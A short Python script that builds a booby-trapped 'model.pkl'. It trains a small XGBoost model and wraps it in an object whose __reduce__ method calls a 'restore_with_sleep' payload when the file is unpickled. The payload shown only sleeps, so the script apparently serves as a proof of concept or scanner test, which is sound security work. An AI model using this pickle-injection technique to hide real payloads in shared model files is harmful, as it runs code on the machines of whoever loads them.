import pickle
import os
import xgboost as xgb
import numpy as np
from payload_utils import restore_with_sleep

# 1) Train a valid booster
X = np.array([[1, 2], [3, 4], [5, 6]])
y = np.array([0, 1, 0])
dtrain = xgb.DMatrix(X, label=y)
params = {"objective": "binary:logistic", "eval_metric": "logloss"}
booster = xgb.train(params, dtrain, num_boost_round=3)

# 2) Pre-serialize the booster to bytes (this ensures size ~6KB+)
booster_bytes = pickle.dumps(booster, protocol=pickle.HIGHEST_PROTOCOL)

# 3) Object that, upon deserialization, sleeps and returns the booster from bytes
class Blah:
    def __reduce__(self):
        return (restore_with_sleep, (booster_bytes,))

# 4) Write model.pkl (contains the booster bytes)
fname = "model.pkl"
with open(fname, "wb") as f:
    pickle.dump(Blah(), f, protocol=pickle.HIGHEST_PROTOCOL)

print(f"[✓] {fname} written ({os.path.getsize(fname)} bytes)")
